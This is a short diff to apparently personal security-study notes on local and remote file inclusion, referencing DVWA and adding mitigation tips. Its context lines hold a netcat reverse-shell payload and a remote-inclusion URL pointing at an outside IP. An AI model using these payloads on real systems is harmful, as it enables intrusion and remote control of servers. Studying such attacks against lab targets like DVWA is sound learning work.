@@ -11,6 +11,9 @@
 
 - Example
   - [DVWA](../BuggyApp/DVWA/file-inclusion.md)  
+  
+- Mitigation
+  - Use static file inclusion. hard code the fiels that we want to include in the code.
 
 ## Remote
 - Exploit
@@ -26,4 +29,5 @@ passthru('nc -e /bin/sh 10.20.14.203 8080');
   - ```?page=hTTp://10.20.14.203/reverse.txt?```
 
 - Mitigation
-  -  
+  -  Disable *"allow_url_fopen = On"* & *"allow_url_include = On"*
+
